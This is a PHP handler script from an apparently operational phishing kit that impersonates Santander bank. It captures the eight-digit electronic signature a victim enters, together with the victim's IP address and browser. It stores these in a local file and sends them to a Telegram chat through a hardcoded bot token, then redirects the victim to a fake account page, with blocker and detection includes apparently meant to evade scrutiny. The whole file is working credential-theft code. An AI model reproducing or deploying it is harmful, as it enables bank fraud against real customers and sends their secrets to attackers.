<?php
include("./lib/simple_html_dom.php");
include './lib/Telegram.php';

session_start();
include("../HOSTER.php"); 
include("blocker.php");
include("detect.php");

$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	
$msg.="------------------------------\r\n";
$msg=" |+ BANk|Vbv(SANT-ANDER) ///Neo-tor\r\n";
$msg.="|+ FIRMA ELECTRÓNICA : {$_POST['k1']}{$_POST['k2']}{$_POST['k3']}{$_POST['k4']}{$_POST['k5']}{$_POST['k6']}{$_POST['k7']}{$_POST['k8']} \r\n";
$msg.="------------------------------\r\n";
$msg.="|+ localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="|+ BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../SHAN-TAN.txt","a+");fwrite($save,$msg);fclose($save);
$subject="FIRMA(SANTANDERBANk) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: Neo-Tor™<info>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
$telegramLuffy = new Telegram('5715277551:AAFOo65B5-YXURu_bdBWUfQv329y3PC_aHU');
$contentLuffy = array('chat_id' => "-774340588", 'text' => $msg);
$telegramLuffy->sendMessage($contentLuffy);

header("Location: ../../Mi_cuenta"); /* Redirect browser */

?>